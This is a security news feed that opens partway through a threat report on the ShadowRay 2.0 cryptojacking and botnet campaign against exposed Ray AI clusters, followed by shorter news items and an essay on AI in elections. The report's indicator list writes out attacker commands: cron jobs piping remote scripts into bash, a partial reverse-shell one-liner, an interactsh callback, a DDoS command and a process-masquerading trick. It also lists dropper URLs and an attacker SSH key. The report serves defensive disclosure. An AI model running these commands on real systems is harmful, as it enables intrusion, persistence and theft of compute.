binaries from different repositories, hosts and IPs over time. We found this gitlab username in one of the payload’s comments, probably leftovers of an older payload from an older repository. 12: Live Campaign Evolution - "Attack Infrastructure as Code"The GitLab repository ironern440-group/ironern440-project showed active commits, meaning attackers are iterating on their payloads in real-time. All compromised systems pulled updates every 15 minutes, so improvements propagate across the entire botnet within hours.This is DevOps for cybercrime. Attackers used GitLab as their CI/CD pipeline for malware distribution. They can A/B test techniques, roll back failed updates, and respond to defensive measures - all through version control. The commit history showed active development in realtime.The files when accessed in Nov. 2The files when accessed in Nov. 4Attacker payload changes were visible through GitLab.The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.The diff was visible through GitLab easily - a commit that removes all comments of the LLM-generated payloads.Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases13: Sensitive Data Access - "Beyond Cryptocurrency"Attackers could see everything the workloads are doing - including access to the proprietary AI models and filesystem, application user requests, application code and configuration.They discovered and exfiltrated MySQL database credentials from Ray job environment variables and config files. The exposed credentials provide root access to a MySQL database that is used in production application.We also found many security tokens and cloud credentials present on the compromised machines workloads - by analyzing the code, command lines and and the environment variables of the running processes on the compromised machines. This reveals the attack scope extends beyond cryptojacking.With database credentials, attackers can exfiltrate sensitive data, inject backdoors into applications, or sell access to other threat actors. The presence of MySQL credentials in environment variables (just one example) suggests the compromised system is part of a larger application infrastructure.On some instances that models were present (for example, pytorch pickle file of the model weights and frozen graph). These proprietary, custom models are considered unique IP that is a competitive advantage to the company. Attackers could steal them from the compromised machines, as well as their source code and user data that was retained on the machines.14: DDoS in action - "Multi-Purpose Botnet"Attackers deployed sockstress, a TCP state exhaustion tool, targeting production websites. This suggests the compromised Ray clusters are being weaponized for denial-of-service attacks, possibly against competing mining pools or other infrastructure - or as another way to monetize their compromised hardware (compromised infrastructure as a service).This transforms the operation from pure cryptojacking into a. The ability to adds another monetization vector - attackers can rent out DDoS capacity or use it to eliminate competition. The target port 3333 is commonly used by mining pools, suggesting attacks against rival mining infrastructure.DDoS Command used by attackers:./sockstress <redacted_hostname> 3333 eth0 -p payloads/http15: Spray and Pray - "Using Victims to Find More Victims"Compromised Ray clusters were used to spray attack payloads to other Ray dashboards worldwide. The attackers essentially created a self-propagating worm that uses one victim to scan for and compromise the next victim.This is worm-like behavior in cloud infrastructure. Instead of centralized scanning (which is noisy and detectable), attackers distributed the scanning across their botnet. Each compromised cluster helps discover and infect new clusters, creating exponential growth. The use of interact.sh for callback means attackers only see successful compromises, reducing noise.Compromised Cluster A scans for exposed Ray dashboardsSends test payload with interact.sh callbackAttacker sees successful callbackAttacker sends full payload to new victimNew victim joins botnet and starts scanningGitHub-Launched Attack Campaign: Technical Breakdown and Evidence of TechniquesFollowing the attackers’ GitLab account and repository being taken down on November 5, 2025, the attackers migrated the repo to GitHub, where they remain active. They created the new GitHub repo on November 10, 2025.Below, we walk through the techniques the attackers used with GitHub as their delivery mechanism, providing evidence of what was uncovered and how they evolved their methods. The second phase was even more successful.Attackers Ported to GitHub on November 10, 2025. We identified a compromised Ray cluster and were surprised to see  in the payload from the willd, replacing the repository that was removed by GitLab after we reported the first phase.Compromised Clusters With Thousands of Active Nodes (machines)Attackers put hands on internet-facing clusters with (Worth $4M USD per year) - utilizing 100% CPU on the compromised Ray nodes:One of the servers had a network NFS mount, which included  of Source Code, AI Models and Datasets. Everything the company is doing for the past few years, exposed to the internet.:In a new mining pool for the second phase of the attack, the attackers reached the #1 spot among 100+ registered miners. The attacker HashRate (and financial reward) kept increasing until we reported the user activity to GitHub.An ELF executable that was downloaded from the attacker’s servers. We started reverse engineering it . It was an unpacker with unpopular compression that executed code through stack-based syscall direct execution Why It Matters: Growing AI Attack SurfaceAI workloads are increasingly deployed at scale, often with less mature security controls than traditional infrastructure. Because Ray’s design assumes an internal, trusted environment, many clusters are deployed with ports exposed publicly, and authentication disabled. These factors make ShadowRay a ripe vulnerability for attackers to exploit, as it has a dangerous combination of a lot of exposed infrastructure and the ability to lead to meaningful impact for attackers. As organizations race to deploy AI systems, it’s critical to remember that many AI products and services embed or depend on Ray, making it pivotal to ensure it is configured properly across environments. Plus, many AI orchestration tools remain vulnerable to 0.0.0.0-style misconfigurations that mirror ShadowRay’s exploitation pattern. The Risk of Disputed VulnerabilitiesThe ShadowRay case highlights a critical challenge in modern software security: what happens when a vulnerability is disputed instead of fixed. When Oligo first disclosed active exploitation of CVE-2023-48022 in 2024, the Ray maintainers argued that Ray should only ever run in tightly controlled, closed environments, and therefore saw no need to release a patch. Nearly two years later, attackers are still exploiting the same flaw, in new and increasingly sophisticated campaigns, even in later Ray versions that are up to date.Disputed vulnerabilities create a dangerous gray area for defenders because they are not formally patched. As a result, organizations may unknowingly deploy or run software that remains exploitable in real-world conditions. ShadowRay demonstrates how attackers exploit that uncertainty, targeting configurations that weren’t meant to be internet-facing, chaining legitimate orchestration features, and adapting rapidly with AI-generated payloads.Understanding your environment becomes essential. Knowing not only what open-source components you use, but how they are configured, exposed, and behaving at runtime, can be the difference between protection and compromise.For organizations that run Ray in their environments, below are mitigation and protection recommendations.Follow the Ray Deployment Best Practices for securing Ray deployments. Start with running Ray within a secured, trusted environment.Always add firewall rules or security groups to prevent unauthorized access.Add authorization on top of the Ray Dashboard port (8265 by default). If you do need Ray’s dashboard to be accessible, implement a proxy that adds an authorization layer to the Ray API when exposing it over the network.Continuously monitor your production environments and AI clusters for anomalies, even within Ray. Ray depends on arbitrary code execution to function. Code Scanning and Misconfiguration tools will not be able to detect such attacks, because the open-source maintainers of Ray (Anyscale) marked it as disputed and confirmed it is not a bug - at the time of writing, it is a feature.Don’t bind on 0.0.0.0 to make your life easy - It is recommended to use an IP of an explicit network interface, such as the IP that is in the subnet of your local network or a trusted private VPC/VPN.- Sometimes tools assume you read their docs. Do it. - The technical burden of securing open source is yours. Don't rely on the maintainers, there are tools that can help you protect your production workloads from the risks of using open source at runtime.Indicators of Compromise (IoCs)AWS-hosted primary C2 server for reverse shells - São Paulo, Brazil (Amazon.com, amazonaws.com)Attackers C2 / File server for downloading binariesAttackers C2 / File server for downloading binariesAttackers Reverse Shell - United Kingdom (Tornado Datacenter, cloudzy.com)Attackers Reverse Shell - Seongbuk-gu, Seoul, South Korea (KT, Cable/DSL)Attackers Reverse Shell - Dublin, Ireland (Amazon.com, amazonaws.com)Attackers Reverse Shell - Moscow, Russia (Yandex.Cloud)Attackers Reverse Shell - Helsinki, Finland (Aeza International, ptr.network)Attacker payload server (netsh, myscript.sh) - United States (Gigas Hosting Usa, LLC)Attacker - Reverse Shell - Bogor, Indonesia (PT. Biznet Gio Nusantara, biznetg.io)Attacker AWS-hosted secondary C2 server, XMRig mining - São Paulo, Brazil (Amazon.com, amazonaws.com)Attacker File hosting server for malware distribution (netsh) - United States (Interserver)Attacker file hosting server for malware distribution (xd.sh) based in United StatesOAST platform (interact.sh) callback for discovery reconnaissancebwqqvqfgsseplyoltois92rdukv0mm5th.oast.funAttacker out-of-band interactsh subdomain for out-of-band callback (DNS/HTTP request) - phone home to alert about compromised IPcurl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.funInteractSH attackers oast.fun subdomain callback for discovery before initial access (attacker’s crawlers sprayed this payload)Detaching processes in Ray clusters (Keep the subprocess with reverse shells and cryptominers)Primary Monero mining pool (TLS-encrypted)Secondary Monero Mining Pool45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1Attacker's Monero wallet addressKrQtbtsrPTqSTzQwZZisiyJxgtcDMwrdVrQAttacker ZANO address used in cryptominer payloadZANO Mining pool observed in GitHub second payload (xd.sh)ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHy6WMgqslpdUCaumLmlUcBjBjuAk4KspADxbcAKrzYd root@archtopAttacker’s SSH Public key that was appended to the authorized keys file during the payload, to enable SSH access.gitlab.com/ironern440-group/ironern440-projectPrimary C2 for payload hosting and continuous updatesAttacker's 1st stage GitLab organization (blocked)Attacker's 1st stage GitLab previous organization (blocked)Attacker's 2nd phase GitHub organizationhttps://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.shMonitoring/persistence scripthttps://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.shhttps://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run.shMain execution script (non-China)https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.shhttps://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gzLegitimate XMRig download (v6.16.4)https://github.com/rigelminer/rigel/releases/download/1.22.3/rigel-1.22.3-linux.tar.gzOptimized GPU Miner used in 2nd phase of the campaignhttp://45.61.150.83/1mmy/xd.shMalware Dropper from attacker’s controlled file server - used in 2nd phase of the campaignhttp://45.61.150.83/1mmy/cloudMalware Dropper from attacker’s controlled file server - used in 2nd phase of the campaign6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063SHA256 of the XMRig Binary from GitHub (version 6.16.4)1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6bHash of secondary bash dropped/unpacker (xd.sh)1f63fa7921c2f5fb8f8ffa430d02ac4aHash of secondary bash dropped/unpacker (xd.sh)779a8af3b9838a33d1e199da3fc2f02a49e7c13eHash of secondary bash dropped/unpacker (xd.sh)http://67.217.57.240:666/files/netshMalicious binary download - reverse shellMasqueraded XMRig miner binary/usr/lib/dev/systemdev/dns-filterFull path to disguised minerHidden XMRig miner binary (note the leading dot)GPU Optimized Cryptominer from https://github.com/rigelminer/rigel/releases/download/1.22.3/GPU Optimized Cryptominer from https://github.com/rigelminer/rigel/releases/download/1.22.3/Downloaded malicious binaryAlternative XMRig binary locationMonitoring and persistence scriptCleanup script variant (competition elimination)Main execution script (non-China regions)China-specific payload with network proxyFull path to persistence scriptMasqueraded as legitimate Linux kernel workerMasqueraded as DNS filtering serviceBracket notation indicates process name manipulation via /proc/$$/comm/usr/lib/dev/systemdev/dns-filter -o [host] --tlsXMRig mining to C2 with TLSpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([host],[port]));./sockstress eth0 -p payloads/http/bin/bash /var/tmp/.ddns.shPersistence script execution*/15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bashExecutes monitoring script every 15 minutes*/15 * * * * curl -s https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bashMalicious commands injected into user shell profileNodeAffinitySchedulingStrategyRay feature weaponized for lateral movementBlock entries for rival mining poolsModified to block competitorsiptables -A OUTPUT -p tcp --dport 3333 -j DROPBlocking Monero mining portiptables -A OUTPUT -p tcp --dport 5555 -j DROPBlocking alternative mining portiptables -A OUTPUT -p tcp --dport 7777 -j DROPBlocking alternative mining portTargets: xmrig, minerd, ccminer, crypto-pool, etc.Active termination of rival minersChina IP range detection using http://ip-api.com/json/Delivers region-specific payloadsrun-CN.sh execution for Chinese IPs payloadsUses GitHub proxy for network access60% CPU/GPU allocation to hide activityConfigured to avoid detectionecho "kworker/0:0" > /proc/$$/commMasquerades as kernel processIf you have any questions and need help assessing your environment, you can schedule a threat briefing with our research team by reaching out to info@oligosecurity.io.ShadowRay 2.0 underscores how quickly and broadly a flaw, coupled with misconfigurations, can escalate into easily propagated compromise – and also why runtime context is the source of truth that security teams need. With Oligo, teams gain deterministic proof of exploitability, real-time detection of malicious behavior, and automatic correlation across every step of the modern attack chain. Instead of drowning in theoretical alerts or reacting after the fact, security teams can confidently identify and prevent threats like this the moment they emerge.See below for examples of how Oligo’s runtime security platform can detect and prevent techniques like those used in the ShadowRay 2.0 campaign. If you’re interested in learning how Oligo’s runtime security platform unifies real-time protection across applications, cloud, workloads, and AI systems, set some time to connect here.]]></content:encoded></item><item><title>Tycoon 2FA and the Collapse of Legacy MFA</title><link>https://www.bleepingcomputer.com/news/security/tycoon-2fa-and-the-collapse-of-legacy-mfa/</link><author>Sponsored by Token</author><category>security</category><pubDate>Tue, 18 Nov 2025 15:01:11 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Tycoon 2FA enables turnkey real-time MFA relays behind 64,000+ attacks this year, proving legacy MFA collapses the moment a phishing kit targets it. Learn from Token Ring how biometric, phishing-proof FIDO2 hardware blocks these relay attacks before they succeed. [...]]]></content:encoded></item><item><title>The Tycoon 2FA Phishing Platform and the Collapse of Legacy MFA</title><link>https://www.bleepingcomputer.com/news/security/the-tycoon-2fa-phishing-platform-and-the-collapse-of-legacy-mfa/</link><author>Sponsored by Token</author><category>security</category><pubDate>Tue, 18 Nov 2025 15:01:11 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Tycoon 2FA enables turnkey real-time MFA relays behind 64,000+ attacks this year, proving legacy MFA collapses the moment a phishing kit targets it. Learn from Token Ring how biometric, phishing-proof FIDO2 hardware blocks these relay attacks before they succeed. [...]]]></content:encoded></item><item><title>Thieves order a tasty takeout of names and addresses from DoorDash</title><link>https://www.malwarebytes.com/blog/news/2025/11/thieves-order-a-tasty-takeout-of-names-and-addresses-from-doordash</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 14:24:54 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[DoorDash is known for delivering takeout food, but last month the company accidentally served up a tasty plate of personal data, too. It disclosed a breach on October 25, 2025, where an employee fell for a social engineering attack that allowed attackers to gain account access.Breaches like these are sadly common, but it’s how DoorDash handled this breach, along with another security issue, that have given some cause for concern.Information stolen during the breach varied by user, according to DoorDash, which connects gig economy delivery drivers with people wanting food bought to their door. It said that , , , and  were stolen.DoorDash said that as well as telling law enforcement, it has added more employee training and awareness, hired a third party company to help with the investigation, and deployed unspecified improvements to its security systems to help stop similar breaches from happening again. It cooed:“At DoorDash, we believe in continuous improvement and getting 1% better every day.”However, it might want to get a little better at disclosing breaches, warn experts. It left almost three weeks in between the discovery of the event on October 25 and notifying customers on November 13, angering some customers.Just as irksome for some was the company’s insistence that “no sensitive information was accessed”. It classifies this as Social Security numbers or other government-issued identification numbers, driver’s license information, or bank or payment card information. While that data wasn’t taken, names, addresses, phone numbers, and emails are pretty sensitive.One Canadian user on X was angry enough to claim a violation of Canadian breach law, and promised further action:“I should have been notified immediately (on Oct 25) of the leak and its scope, and told they would investigate to determine if my account was affected—that way I could take the necessary precautions to protect my privacy and security. […] This process violates Canadian data breach law. I’ll be filing a case against DoorDash in provincial small claims court and making a complaint to the Office of the Privacy Commissioner of Canada.”How soon should breach notifications happen?How long is too long when it comes to breach notification? From an ethical standpoint, companies should tell customers as quickly as possible to ensure that individuals can protect themselves—but they also need time to understand what has happened. Some of these attacks can be complex, involving bad actors that have been inside networks for months and have established footholds in the system.In some jurisdictions, privacy law dictates notification within a certain period, while others are vague. Canada’s Personal Information Protection and Electronic Documents Act (PIPEDA) simply requires notification as soon as is feasible. In the US, disclosure laws are currently set on a per-state level. For example, California recently passed Senate Bill 446, which mandates reporting breaches to consumers within 30 days as of January 1, 2026. That would still leave DoorDash’s latest breach report in compliance though.This isn’t the only disclosure controversy currently surrounding DoorDash. Security researcher doublezero7 discovered an email spoofing flaw in DoorDash for Business, its platform for companies to handle meal deliveries.The flaw allowed anyone to create a free account, add fake employees, and send branded emails from DoorDash servers. Those mails would pass various email client security tests and land without a spam message in email inboxes, the researcher said.The researcher filed a report with bug bounty program HackerOne in July 2024, but it was closed as “Informative”. DoorDash didn’t fix it until this month, after the researcher complained.However, all might not be as it seems. DoorDash has complained that the researcher made financial demands around disclosure timelines that felt extortionate, according to Bleeping Computer.What actions can you take?Back to the data breach issue. What can you do to protect yourself against events like these? The Canadian X user explains that they used a fake name and forwarded email address for their account, but that didn’t stop their real phone number and physical address being leaked.You can’t avoid using your real credit card number, either—although many ecommerce sites will make saving credit card details optional.Perhaps the best way to stay safe is to use a credit monitoring service, and to watch news sites like this one for information about breaches… whenever companies decide to disclose them.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>Researchers Detail Tuoni C2&apos;s Role in an Attempted 2025 Real-Estate Cyber Intrusion</title><link>https://thehackernews.com/2025/11/researchers-detail-tuoni-c2s-role-in.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0fEPwtke4h6m4SAYqYOUAQSTCvVaghxz5SGIgAKzQlXlriWAB02H4u9ueIs8oX7vH4a3Xx46gIt-0qC_eEECEMdyBADDmMnoNvbNM-5wIwkVPSo0f88Sy2Ik5bvBQdxtwRWGO6vQvzj_rPWpAYJbfOuGNK0q6yNhyE9QR5h98xsW7d8A6yBQ8p0P5bt4G/s1600/c2.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 14:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a cyber attack targeting a major U.S.-based real-estate company that involved the use of a nascent command-and-control (C2) and red teaming framework known as Tuoni.
"The campaign leveraged the emerging Tuoni C2 framework, a relatively new, command-and-control (C2) tool (with a free license) that delivers stealthy, in-memory payloads,"]]></content:encoded></item><item><title>Iranian Hackers Use DEEPROOT and TWOSTROKE Malware in Aerospace and Defense Attacks</title><link>https://thehackernews.com/2025/11/iranian-hackers-use-deeproot-and.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgANn6HS89nO5bbMqMw7uLG3adyrOqaceztN7_QFT7PAalBP3sITkB3y9z_36naCvTv5YRhgusQx6tXEB9nSmQAru_0EV5LNLyj2FWdZwcD55V4ODt_EJtB4KOipfALbQ_U1pklNh50PFR8P4A_G6D6E3ua0sTbk-JIn0ZF5RTFkY51dw5IyzsI7IJGcl3h/s1600/Aerospace-hackers.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 12:54:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Suspected espionage-driven threat actors from Iran have been observed deploying backdoors like TWOSTROKE and DEEPROOT as part of continued attacks aimed at aerospace, aviation, and defense industries in the Middle East.
The activity has been attributed by Google-owned Mandiant to a threat cluster tracked as UNC1549 (aka GalaxyGato, Nimbus Manticore, or Subtle Snail), which was first documented]]></content:encoded></item><item><title>Cloudflare hit by outage affecting Global Network services</title><link>https://www.bleepingcomputer.com/news/technology/cloudflare-hit-by-outage-affecting-global-network-services/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 18 Nov 2025 12:24:59 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Cloudflare is investigating an outage affecting its global network services, with users encountering "internal server error" messages when attempting to access affected websites and online platforms. [...]]]></content:encoded></item><item><title>AI and Voter Engagement</title><link>https://www.schneier.com/blog/archives/2025/11/ai-and-voter-engagement.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Tue, 18 Nov 2025 12:01:44 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Social media has been a familiar, even mundane, part of life for nearly two decades. It can be easy to forget it was not always that way.In 2008, social media was just emerging into the mainstream. Facebook reached 100 million users that summer. And a singular candidate was integrating social media into his political campaign: Barack Obama. His campaign’s use of social media was so bracingly innovative, so impactful, that it was viewed by journalist David Talbot and others as the strategy that enabled the first term Senator to win the White House.Over the past few years, a new technology has become mainstream: AI. But still, no candidate has unlocked AI’s potential to revolutionize political campaigns. Americans have three more years to wait before casting their ballots in another Presidential election, but we can look at the 2026 midterms and examples from around the globe for signs of how that breakthrough might occur.Rereading the contemporaneous reflections of the  late media critic, David Carr, on Obama’s campaign reminds us of just how new social media felt in 2008. Carr positions it within a now-familiar lineage of revolutionary communications technologies from newspapers to radio to television to the internet.The Obama campaign and administration demonstrated that social media was different from those earlier communications technologies, including the pre-social internet. Yes, increasing numbers of voters were getting their news from the internet, and content about the then-Senator sometimes made a splash by going viral. But those were still broadcast communications: one voice reaching many. Obama found ways to connect voters to each other.In describing what social media revolutionized in campaigning, Carr quotes campaign vendor Blue State Digital’s Thomas Gensemer: “People will continue to expect a conversation, a two-way relationship that is a give and take.”The Obama team made some earnest efforts to realize this vision. His transition team launched change.gov, the website where the campaign collected a “Citizen’s Briefing Book” of public comment. Later, his administration built We the People, an online petitioning platform.But the lasting legacy of Obama’s 2008 campaign, as political scientists Hahrie Han and Elizabeth McKenna chronicled, was pioneering online “relational organizing.” This technique enlisted individuals as organizers to activate their friends in a self-perpetuating web of relationships.Perhaps because of the Obama campaign’s close association with the method, relational organizing has been touted repeatedly as the linchpin of Democratic campaigns: in 2020, 2024, and today. But research by non-partisan groups like Turnout Nation and right-aligned groups like the Center for Campaign Innovation has also empirically validated the effectiveness of the technique for inspiring voter turnout within connected groups.The Facebook of 2008 worked well for relational organizing. It gave users tools to connect and promote ideas to the people they know: college classmates, neighbors, friends from work or church. But the nature of social networking has changed since then.For the past decade, according to Pew Research, Facebook use has stalled and lagged behind YouTube, while Reddit and TikTok have surged. These platforms are less useful for relational organizing, at least in the traditional sense. YouTube is organized more like broadcast television, where content creators produce content disseminated on their own channels in a largely one-way communication to their fans. Reddit gathers users worldwide in forums (subreddits) organized primarily on topical interest. The endless feed of TikTok’s “For You” page disseminates engaging content with little ideological or social commonality. None of these platforms shares the essential feature of Facebook c. 2008: an organizational structure that emphasizes direct connection to people that users have direct social influence over.AI and Relational OrganizingIdeas and messages might spread virally through modern social channels, but they are not where you convince your friends to show up at a campaign rally. Today’s platforms are spaces for political hobbyism, where you express your political feelings and see others express theirs.Relational organizing works when one person’s action inspires others to do this same. That’s inherently a chain of human-to-human connection. If my AI assistant inspires your AI assistant, no human notices and one’s vote changes. But key steps in the human chain can be assisted by AI. Tell your phone’s AI assistant to craft a personal message to one friend—or a hundred—and it can do it.So if a campaign hits you at the right time with the right message, they might persuade you to task your AI assistant to ask your friends to donate or volunteer. The result can be something more than a form letter; it could be automatically drafted based on the entirety of your email or text correspondence with that friend. It could include references to your discussions of recent events, or past campaigns, or shared personal experiences. It could sound as authentic as if you’d written it from the heart, but scaled to everyone in your address book.Research suggests that AI can generate and perform written political messaging about as well as humans. AI will surely play a tactical role in the 2026 midterm campaigns, and some candidates may even use it for relational organizing in this way.(Artificial) Identity PoliticsFor AI to be truly transformative of politics, it must change the way campaigns work. And we are starting to see that in the US.The earliest uses of AI in American political campaigns are, to be polite, uninspiring. Candidates viewed them as just another tool to optimize an endless stream of email and text message appeals, to ramp up political vitriol, to harvest data on voters and donors, or merely as a stunt.Of course, we have seen the rampant production and spread of AI-powered deepfakes and misinformation. This is already impacting the key 2026 Senate races, which are likely to attract hundreds of millions of dollars in financing. Roy Cooper, Democratic candidate for US Senate from North Carolina, and Abdul El-Sayed, Democratic candidate for Senate from Michigan, were both targeted by viral deepfake attacks in recent months. This may reflect a growing trend in Donald Trump’s Republican party in the use of AI-generated imagery to build up GOP candidates and assail the opposition.And yet, in the global elections of 2024, AI was used more memetically than deceptively. So far, conservative and far right parties seem to have adopted this most aggressively. The ongoing rise of Germany’s far-right populist AfD party has been credited to its use of AI to generate nostalgic and evocative (and, to many, offensive) campaign images, videos, and music and, seemingly as a result, they have dominated TikTok. Because most social platforms’ algorithms are tuned to reward media that generates an emotional response, this counts as a double use of AI: to generate content and to manipulate its distribution.AI can also be used to generate politically useful, though artificial, identities. These identities can fulfill different roles than humans in campaigning and governance because they have differentiated traits. They can’t be imprisoned for speaking out against the state, can be positioned (legitimately or not) as unsusceptible to bribery, and can be forced to show up when humans will not.In Venezuela, journalists have turned to AI avatars—artificial newsreaders—to report anonymously on issues that would otherwise elicit government retaliation. Albania recently “appointed” an AI to a ministerial post responsible for procurement, claiming that it would be less vulnerable to bribery than a human. In Virginia, both in 2024 and again this year, candidates have used AI avatars as artificial stand-ins for opponents that refused to debate them.And yet, none of these examples, whether positive or negative, pursue the promise of the Obama campaign: to make voter engagement a “two-way conversation” on a massive scale.The closest so far to fulfilling that vision anywhere in the world may be Japan’s new political party, Team Mirai. It started in 2024, when an independent Tokyo gubernatorial candidate, Anno Takahiro, used an AI avatar on YouTube to respond to 8,600 constituent questions over a seventeen-day continuous livestream. He collated hundreds of comments on his campaign manifesto into a revised policy platform. While he didn’t win his race, he shot up to a fifth place finish among a record 56 candidates.Anno was RECENTLY elected to the upper house of the federal legislature as the founder of a new party with a 100 day plan to bring his vision of a “public listening AI” to the whole country. In the early stages of that plan, they’ve invested their share of Japan’s 32 billion yen in party grants—public subsidies for political parties—to hire engineers building digital civic infrastructure for Japan. They’ve already created platforms to provide transparency for party expenditures, and to use AI to make legislation in the Diet easy, and are meeting with engineers from US-based Jigsaw Labs (a Google company) to learn from international examples of how AI can be used to power participatory democracy.Team Mirai has yet to prove that it can get a second member elected to the Japanese Diet, let alone to win substantial power, but they’re innovating and demonstrating new ways of using AI to give people a way to participate in politics that we believe is likely to spread.AI could be used in the US in similar ways. Following American federalism’s longstanding model of “laboratories of democracy,” we expect the most aggressive campaign innovation to happen at the state and local level.D.C. Mayor Muriel Bowser is partnering with MIT and Stanford labs to use the AI-based tool deliberation.io to capture wide scale public feedback in city policymaking about AI. Her administration said that using AI in this process allows “the District to better solicit public input to ensure a broad range of perspectives, identify common ground, and cultivate solutions that align with the public interest.”It remains to be seen how central this will become to Bowser’s expected re-election campaign in 2026, but the technology has legitimate potential to be a prominent part of a broader program to rebuild trust in government. This is a trail blazed by Taiwan a decade ago. The vTaiwan initiative showed how digital tools like Pol.is, which uses machine learning to make sense of real time constituent feedback, can scale participation in democratic processes and radically improve trust in government. Similar AI listening processes have been used in Kentucky, France, and Germany.Even if campaigns like Bowser’s don’t adopt this kind of AI-facilitated listening and dialog, expect it to be an increasingly prominent part of American public debate. Through a partnership with Jigsaw, Scott Rasmussen’s Napolitan Institute will use AI to elicit and synthesize the views of at least five Americans from every Congressional district in a project called “We the People.” Timed to coincide with the country’s 250th anniversary in 2026, expect the results to be promoted during the heat of the midterm campaign and to stoke interest in this kind of AI-assisted political sensemaking.In the year where we celebrate the American republic’s semiquincentennial and continue a decade-long debate about whether or not Donald Trump and the Republican party remade in his image is fighting for the interests of the working class, representation will be on the ballot in 2026. Midterm election candidates will look for any way they can get an edge. For all the risks it poses to democracy, AI presents a real opportunity, too, for politicians to engage voters en masse while factoring their input into their platform and message. Technology isn’t going to turn an uninspiring candidate into Barack Obama, but it gives any aspirant to office the capability to try to realize the promise that swept him into office.This essay was written with Nathan E. Sanders, and originally appeared in The Fulcrum.]]></content:encoded></item><item><title>Learn How Leading Companies Secure Cloud Workloads and Infrastructure at Scale</title><link>https://thehackernews.com/2025/11/learn-how-leading-companies-secure.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbcnxxrLCNLtK2nayB0ljqkqYjos86JEosexUyndcUIx-1Bq4QIjQ7HEsPubzDGy_ZQiwc8Otm_rOZ94X_R8mDzqhCdwjETneYetBvv54f7askg7riPyV0GEVIYA6RIo6bkbFw8g6HCJPok_liEsSirCMxE3jkrLczdpV_4Sq2vw5NMJzqU2Z8btfgyfY/s1600/webinar.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[You’ve probably already moved some of your business to the cloud—or you’re planning to. That’s a smart move. It helps you work faster, serve your customers better, and stay ahead.
But as your cloud setup grows, it gets harder to control who can access what.
Even one small mistake—like the wrong person getting access—can lead to big problems. We're talking data leaks, legal trouble, and serious]]></content:encoded></item><item><title>Why it matters when your online order is drop-shipped</title><link>https://www.malwarebytes.com/blog/news/2025/11/why-it-matters-when-your-online-order-is-drop-shipped</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 11:21:32 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Online shopping has never been easier. A few clicks can get almost anything delivered straight to your door, sometimes at a surprisingly low price. But behind some of those deals lies a fulfillment model called drop-shipping. It’s not inherently fraudulent, but it can leave you disappointed, stranded without support, or tangled in legal and safety issues.I’m in the process of de-Googling myself, so I’m looking to replace my Fitbit. Since Google bought Fitbit, it’s become more difficult to keep your information from them—but that’s a story for another day.Of course, Facebook picked up on my searches for replacements and started showing me ads for smartwatches. Some featured amazing specs at very reasonable prices. But I had never heard of the brands, so I did some research and quickly fell into the world of drop-shipping.What is drop-shipping, and why is it risky?Drop-shipping means the seller never actually handles the stock they advertise. Instead, they pass your order to another company—often an overseas manufacturer or marketplace vendor—and the product is then shipped directly to you. On the surface, this sounds efficient: less overhead for sellers and more choices for buyers. In reality, the lack of oversight between you and the actual supplier can create serious problems.One of the biggest concerns is quality control, or the lack of it. Because drop-shippers rely on third parties they may never have met, product descriptions and images can differ wildly from what’s delivered. You might expect a branded electronic device and receive a near-identical counterfeit with dubious safety certifications. With chargers, batteries, and children’s toys, poor quality control isn’t just disappointing, it can be downright dangerous. Goods may not meet local standards and safety protocols, and contain unhealthy amounts of chemicals.Buyers might unknowingly receive goods that lack market approval or conformity marks such as CE (Conformité Européenne = European Conformity), the UL (Underwriters Laboratories) mark, or FCC certification for electronic devices. Customs authorities can and do seize noncompliant imports, resulting in long delays or outright confiscation. Some buyers report being asked to provide import documentation for items they assumed were domestic purchases.Then there’s the issue of consumer rights. Enforcing warranties or returns gets tricky when the product never passed through the 